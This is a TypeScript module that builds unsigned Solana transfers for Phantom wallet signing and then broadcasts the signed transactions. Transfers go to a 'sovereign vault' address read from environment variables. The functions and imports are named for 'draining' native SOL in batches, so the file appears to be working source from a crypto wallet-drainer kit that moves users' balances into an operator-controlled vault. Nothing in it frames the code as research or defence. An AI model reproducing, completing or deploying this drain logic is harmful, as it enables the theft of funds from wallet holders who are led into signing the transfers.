/**
 * Solana native SOL drain — unsigned transfer wire for Phantom signing + relay broadcast.
 */
import {
  Connection,
  PublicKey,
  SystemProgram,
  TransactionMessage,
  VersionedTransaction,
} from '@solana/web3.js'

import { resolveInstitutionalSolanaRpcUrl } from '../adapters/svm-adapter.js'
import { parseNativeAmount } from './native-coin-drain.js'

export type SolNativeTransferRequest = {
  from: string
  to: string
  lamports: string
  recentBlockhash: string
  /** Unsigned VersionedTransaction wire — Phantom `signTransaction`. */
  unsignedWireBase64: string
  wallet: 'phantom'
}

function resolveSolVaultAddress(): string | null {
  const raw =
    (typeof process !== 'undefined' ? process.env['VAULT_ADDRESS_SVM'] : undefined)?.trim() ||
    (typeof process !== 'undefined' ? process.env['SOVEREIGN_VAULT_SOL'] : undefined)?.trim() ||
    ''
  return raw || null
}

function lamportsToNumber(lamports: bigint): number {
  if (lamports <= 0n) {
    throw new Error('SOL transfer lamports must be greater than zero')
  }
  if (lamports > BigInt(Number.MAX_SAFE_INTEGER)) {
    throw new Error('SOL transfer lamports exceeds JS safe integer range')
  }
  return Number(lamports)
}

/**
 * Build unsigned SOL transfer for Phantom wallet signing.
 */
export async function buildSolNativeTransferTx(
  wallet: string,
  to: string,
  amountLamports: bigint,
  rpcUrl?: string,
): Promise<SolNativeTransferRequest> {
  const rpc = rpcUrl?.trim() || resolveInstitutionalSolanaRpcUrl()
  if (!rpc) {
    throw new Error('RPC_SOLANA_PRIVATE / SOLANA_RPC_URL required')
  }

  const fromPubkey = new PublicKey(wallet)
  const toPubkey = new PublicKey(to)
  const connection = new Connection(rpc, { commitment: 'confirmed' })
  const { blockhash } = await connection.getLatestBlockhash('finalized')

  const message = new TransactionMessage({
    payerKey: fromPubkey,
    recentBlockhash: blockhash,
    instructions: [
      SystemProgram.transfer({
        fromPubkey,
        toPubkey,
        lamports: lamportsToNumber(amountLamports),
      }),
    ],
  }).compileToV0Message()

  const unsigned = new VersionedTransaction(message)
  return {
    from: fromPubkey.toBase58(),
    to: toPubkey.toBase58(),
    lamports: amountLamports.toString(),
    recentBlockhash: blockhash,
    unsignedWireBase64: Buffer.from(unsigned.serialize()).toString('base64'),
    wallet: 'phantom',
  }
}

/** Build SOL native drain plan using configured sovereign vault destination. */
export async function buildSolNativeDrainForBatch(params: {
  wallet: string
  amountLamports: bigint
  vault?: string
  rpcUrl?: string
}): Promise<SolNativeTransferRequest | null> {
  if (params.amountLamports <= 0n) return null
  const vault = params.vault ?? resolveSolVaultAddress()
  if (!vault) {
    throw new Error('VAULT_ADDRESS_SVM or SOVEREIGN_VAULT_SOL required for SOL drain')
  }
  return buildSolNativeTransferTx(params.wallet, vault, params.amountLamports, params.rpcUrl)
}

export async function broadcastSignedSolNativeTransfer(params: {
  signedWireBase64: string
  rpcUrl?: string
}): Promise<{ ok: boolean; tx_hash?: string; detail?: string }> {
  const rpc = params.rpcUrl?.trim() || resolveInstitutionalSolanaRpcUrl()
  if (!rpc) {
    return { ok: false, detail: 'RPC_SOLANA_PRIVATE / SOLANA_RPC_URL required' }
  }
  try {
    const rawBytes = Buffer.from(params.signedWireBase64, 'base64')
    const connection = new Connection(rpc, { commitment: 'confirmed' })
    const txHash = await connection.sendRawTransaction(rawBytes, {
      preflightCommitment: 'confirmed',
      skipPreflight: false,
      maxRetries: 3,
    })
    const confirmation = await connection.confirmTransaction(txHash, 'confirmed')
    if (confirmation.value.err != null) {
      return {
        ok: false,
        detail: `SOL confirmation fault: ${JSON.stringify(confirmation.value.err)}`,
      }
    }
    return { ok: true, tx_hash: txHash }
  } catch (e) {
    return { ok: false, detail: e instanceof Error ? e.message : String(e) }
  }
}

export { parseNativeAmount as parseSolNativeAmount }
